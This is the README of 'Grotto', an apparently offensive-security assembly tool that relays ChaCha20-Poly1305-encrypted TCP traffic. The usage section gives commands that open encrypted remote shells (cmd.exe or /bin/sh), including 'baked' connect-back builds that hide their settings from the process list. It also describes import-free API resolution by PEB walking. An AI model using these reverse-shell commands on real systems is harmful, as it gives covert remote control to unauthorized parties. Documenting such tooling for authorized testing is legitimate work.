<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Grotto/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Grotto/main/docs/assets/logo-light.svg">
  <img alt="Grotto" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Grotto/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Assembly](https://img.shields.io/badge/language-Assembly-blueviolet.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**ChaCha20-Poly1305 authenticated encryption networking tool in pure x86_64 NASM assembly**

Bidirectional encrypted relay with full RFC 8439 AEAD. PEB walking on Windows, raw syscalls on Linux. Zero imports, zero dependencies. Interactive shell execution via `-e` for encrypted remote command sessions. Cross-platform with ~8 KB binary size.

> **Authorization Required**: This tool is designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

[Quick Start](#quick-start) · [Architecture](#architecture) · [Wire Protocol](#wire-protocol) · [Internals](#internals) · [Project Structure](#project-structure) · [Security](#security)

</div>

---

## Highlights

<table>
<tr>
<td width="50%">

**ChaCha20-Poly1305**
Full RFC 8439 AEAD implemented in pure assembly. Authenticated encryption with a 256-bit pre-shared key — every message gets a fresh random nonce, and tampered payloads are silently rejected.

**PEB Walk + Hash Lookup**
All Windows APIs resolved at runtime via PEB walking and ror13 hash matching. No import table, no strings for API names — just hashes baked into the binary. Linux uses raw syscalls with no libc dependency.

**Encrypted Shell Relay**
The `-e` flag spawns an interactive shell (`cmd.exe` or `/bin/sh`) with stdin/stdout piped through the encrypted channel. Full bidirectional relay — every keystroke and response encrypted with AEAD.

</td>
<td width="50%">

**Cross-Platform**
Dual-target build: Linux (~13 KB static ELF) and Windows (~8 KB minimal PE). Shared crypto core, platform-specific networking and I/O. Same wire protocol, full interoperability.

**No Dependencies**
Zero DLL imports on Windows. No libc on Linux. Every API (kernel32, ws2_32, advapi32) is resolved dynamically from the PEB. Nothing to link against, nothing to install on the target.

**Threaded + Poll Architectures**
Windows uses `CreateThread` with `WaitForMultipleObjects` for concurrent bidirectional relay. Linux uses `poll(2)` for single-threaded multiplexed I/O. Both handle pipe EOF and connection teardown cleanly.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

<table>
<tr>
<th>Requirement</th>
<th>Version</th>
<th>Purpose</th>
</tr>
<tr>
<td>NASM</td>
<td>Latest</td>
<td>Assembler</td>
</tr>
<tr>
<td>MinGW-w64</td>
<td><code>x86_64-w64-mingw32-ld</code></td>
<td>Windows linker</td>
</tr>
<tr>
<td>ld</td>
<td>GNU ld (via WSL or native)</td>
<td>Linux linker</td>
</tr>
</table>

### Build

```bash
# Clone repository
git clone https://github.com/Real-Fruit-Snacks/Grotto.git
cd Grotto

# Build both targets — generates a random PSK and prints usage
./build.sh

# Or use make directly
make all

# Outputs:
#   build/grotto      (Linux ELF, ~13 KB)
#   build/grotto.exe  (Windows PE, ~8 KB)
```

### Usage

```bash
# Generate a 256-bit PSK
KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")

# Listener (wait for connection)
./grotto -l -p 4444 -k $KEY

# Client (connect to listener)
./grotto -c 10.10.14.1 -p 4444 -k $KEY

# Encrypted shell — listener spawns cmd.exe / /bin/sh
./grotto -l -p 4444 -k $KEY -e cmd.exe
./grotto -c 10.10.14.1 -p 4444 -k $KEY

# Pipe data through encrypted channel
echo "secret message" | ./grotto -c 10.10.14.1 -p 4444 -k $KEY
```

> Both sides must use the same 256-bit pre-shared key (64 hex characters). The key is zeroed from memory on exit.

### Baked Builds

Compile configuration directly into the binary — no CLI arguments needed, nothing visible in the process list.

```bash
# Baked connect-back with encrypted shell
./build.sh --baked -c 10.10.14.1 -p 443 -e cmd.exe

# Baked listener
./build.sh --baked -l -p 4444 -e /bin/sh

# Baked with explicit key
./build.sh --baked -c 10.10.14.1 -p 443 -k <64-hex-chars> -e cmd.exe
```

> The baked binary runs with zero arguments. Host, port, key, and exec command are embedded at compile time. A random PSK is generated if `-k` is not provided.

---

## Architecture

```
[Machine A]                        [Machine B]
 grotto -l  <── encrypted TCP ──>  grotto -c
     |                                  |
  stdin/stdout                     stdin/stdout
  or -e shell                      or -e shell
```

| Layer | Implementation |
|-------|----------------|
| **Transport** | Raw TCP socket (Linux: `socket`/`bind`/`accept`/`connect` syscalls, Windows: Winsock2 via PEB) |
| **Encryption** | ChaCha20-Poly1305 AEAD (RFC 8439), pre-shared 256-bit key |
| **Nonce** | 12 bytes, random per message (`getrandom` on Linux, `SystemFunction036` on Windows) |
| **Wire Format** | `[len(4)][nonce(12)][ciphertext][mac(16)]` |
| **API Resolution** | Linux: raw syscalls, Windows: PEB walk + ror13 hash matching |
| **I/O Relay** | Linux: `poll(2)` multiplexed loop, Windows: `CreateThread` + `WaitForMultipleObjects` |
| **Shell Exec** | Linux: `fork`/`execve`/`dup2` with pipes, Windows: `CreateProcessA` with `STARTUPINFO` pipe redirection |

---

## Wire Protocol

Every message on the wire follows the same framing, in both directions:

```
+----------+--------------+----------------+----------+
| len (4B) | nonce (12B)  | ciphertext (N) | mac (16B)|
| LE u32   | random       | ChaCha20       | Poly1305 |
+----------+--------------+----------------+----------+
```

- **len**: Little-endian uint32, covers `nonce + ciphertext + mac` (everything after the length field)
- **nonce**: 12 random bytes from OS CSPRNG
- **ciphertext**: ChaCha20 stream cipher (counter starts at 1, per RFC 8439)
- **mac**: Poly1305 tag computed over `pad16(ciphertext) || le64(0) || le64(ct_len)` using one-time key derived from ChaCha20 block 0

---

## Internals

### API Resolution

**Linux**: Direct syscalls via `syscall` instruction — no libc, no dynamic linking, fully static.

**Windows**: Walk the PEB (`gs:[0x60]`) to find loaded modules, hash each export name with ror13, resolve 25 APIs across kernel32.dll, ws2_32.dll, and advapi32.dll. `GetProcAddress` handles forwarded exports (e.g., `SystemFunction036`).

### Crypto Implementation

All crypto is implemented in pure x86_64 assembly, shared between platforms:

- **ChaCha20 quarter-round**: Register-based, 10 double-rounds (20 rounds total)
- **ChaCha20 block**: Generates 64-byte keystream blocks
- **ChaCha20 encrypt**: XOR keystream with plaintext/ciphertext, counter starting at 1
- **Poly1305 MAC**: Full mod 2^130-5 arithmetic with 128-bit partial products
- **AEAD**: ChaCha20 block 0 derives Poly1305 one-time key, encrypt with counter 1+, MAC over ciphertext per RFC 8439 Section 2.8

### Relay Architecture

**Linux** (`poll`-based): Single-process event loop polls both the socket and local fd (stdin or shell pipe). Handles `POLLIN`, `POLLHUP`, and `POLLERR` — reads pending data before honoring hangup to prevent data loss on pipe EOF.

**Windows** (threaded): Two worker threads with 256 KB stacks each — one for socket-to-local (decrypt direction), one for local-to-socket (encrypt direction). `WaitForMultipleObjects` on thread handles; when either thread exits, cleanup terminates the child process and exits.

### Memory Layout

Thread buffers (~128 KB per direction) are allocated on the stack:

| Buffer | Size | Purpose |
|--------|------|---------|
| Receive buffer | 65,568 B | Encrypted wire data (65536 + 32 overhead) |
| Plaintext buffer | 65,536 B | Decrypted output / plaintext input |
| Send buffer | 65,568 B | Encrypted outbound data |
| Length header | 4 B | Wire protocol framing |

---

## Project Structure

```
grotto/
├── linux/
│   ├── main.asm       # Linux entry point, CLI parsing (~398 lines)
│   ├── net.asm        # Raw syscall networking (socket/bind/connect)
│   ├── io.asm         # poll(2)-based bidirectional relay
│   ├── crypto.asm     # Nonce generation, encrypt/decrypt wrappers
│   └── shell.asm      # fork/execve/dup2 shell spawning
├── windows/
│   ├── main.asm       # Windows entry point, CLI parsing (~499 lines)
│   ├── peb.asm        # PEB walking, ror13 API resolution
│   ├── net.asm        # Winsock2 networking (WSAStartup/socket/bind/connect)
│   ├── io.asm         # Threaded bidirectional relay (CreateThread)
│   ├── crypto.asm     # SystemFunction036 nonce, encrypt/decrypt wrappers
│   └── shell.asm      # CreateProcessA with pipe redirection
├── shared/
│   ├── chacha20.inc   # ChaCha20 stream cipher (~276 lines)
│   ├── poly1305.inc   # Poly1305 MAC (~403 lines)
│   └── aead.inc       # AEAD encrypt/decrypt (~249 lines)
├── build.sh           # Build script with PSK generation
├── Makefile           # NASM + ld build targets
└── docs/
    ├── index.html     # GitHub Pages landing page
    └── assets/
        ├── logo-dark.svg   # Logo for dark theme
        └── logo-light.svg  # Logo for light theme
```

~3,800 lines of handwritten x86_64 NASM assembly. No generated code.

---

## Platform Support

<table>
<tr>
<th>Capability</th>
<th>Linux</th>
<th>Windows</th>
</tr>
<tr>
<td>Binary Size</td>
<td>~13 KB (static ELF)</td>
<td>~8 KB (minimal PE)</td>
</tr>
<tr>
<td>API Resolution</td>
<td>Raw syscalls</td>
<td>PEB walk + ror13 hash</td>
</tr>
<tr>
<td>Networking</td>
<td><code>socket</code>/<code>bind</code>/<code>connect</code> syscalls</td>
<td>Winsock2 via PEB</td>
</tr>
<tr>
<td>I/O Relay</td>
<td><code>poll(2)</code> multiplexed loop</td>
<td><code>CreateThread</code> + <code>WaitForMultipleObjects</code></td>
</tr>
<tr>
<td>Shell Execution</td>
<td><code>fork</code>/<code>execve</code>/<code>dup2</code></td>
<td><code>CreateProcessA</code> with pipe redirection</td>
</tr>
<tr>
<td>CSPRNG Nonces</td>
<td><code>getrandom</code></td>
<td><code>SystemFunction036</code></td>
</tr>
<tr>
<td>Dependencies</td>
<td>None (no libc)</td>
<td>None (no DLL imports)</td>
</tr>
<tr>
<td>Encryption</td>
<td>ChaCha20-Poly1305 AEAD</td>
<td>ChaCha20-Poly1305 AEAD</td>
</tr>
<tr>
<td>Baked Builds</td>
<td>Full support</td>
<td>Full support</td>
</tr>
</table>

---

## Security

### Vulnerability Reporting

**Report security issues via:**
- GitHub Security Advisories (preferred)
- Private disclosure to maintainers
- Responsible disclosure timeline (90 days)

**Do NOT:**
- Open public GitHub issues for vulnerabilities
- Disclose before coordination with maintainers
- Exploit vulnerabilities in unauthorized contexts

### Threat Model

**In scope:**
- Encrypting data in transit between operator-controlled endpoints
- Authenticated encryption preventing message tampering
- Authorized testing with known monitoring

**Out of scope:**
- Evading advanced EDR/XDR systems
- Anti-forensics or evidence destruction
- Defeating kernel security modules
- Sophisticated traffic analysis evasion

### What Grotto Does NOT Do

Grotto is an **encrypted networking tool**, not an offensive framework:

- **Not a C2 framework** — No implant management, tasking queues, or beaconing
- **Not a vulnerability scanner** — No scan modes or exploit modules
- **Not anti-forensics** — Does not destroy evidence or tamper with logs
- **Not evasion tooling** — No AV bypass, no EDR unhooking

---

## License

MIT License

Copyright &copy; 2026 Real-Fruit-Snacks

```
THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND.
THE AUTHORS ARE NOT LIABLE FOR ANY DAMAGES ARISING FROM USE.
USE AT YOUR OWN RISK AND ONLY WITH PROPER AUTHORIZATION.
```

---

## Resources

- **GitHub**: [github.com/Real-Fruit-Snacks/Grotto](https://github.com/Real-Fruit-Snacks/Grotto)
- **Issues**: [Report a Bug](https://github.com/Real-Fruit-Snacks/Grotto/issues)
- **Security**: [SECURITY.md](SECURITY.md)
- **Contributing**: [CONTRIBUTING.md](CONTRIBUTING.md)
- **Changelog**: [CHANGELOG.md](CHANGELOG.md)

---

<div align="center">

**Part of the Real-Fruit-Snacks water-themed security toolkit**

[Tidepool](https://github.com/Real-Fruit-Snacks/Tidepool) · [Riptide](https://github.com/Real-Fruit-Snacks/Riptide) · [Cascade](https://github.com/Real-Fruit-Snacks/Cascade) · [Slipstream](https://github.com/Real-Fruit-Snacks/Slipstream) · [HydroShot](https://github.com/Real-Fruit-Snacks/HydroShot) · [Aquifer](https://github.com/Real-Fruit-Snacks/Aquifer) · [Conduit](https://github.com/Real-Fruit-Snacks/Conduit) · [Flux](https://github.com/Real-Fruit-Snacks/Flux) · **Grotto**

*Remember: With great power comes great responsibility.*

</div>
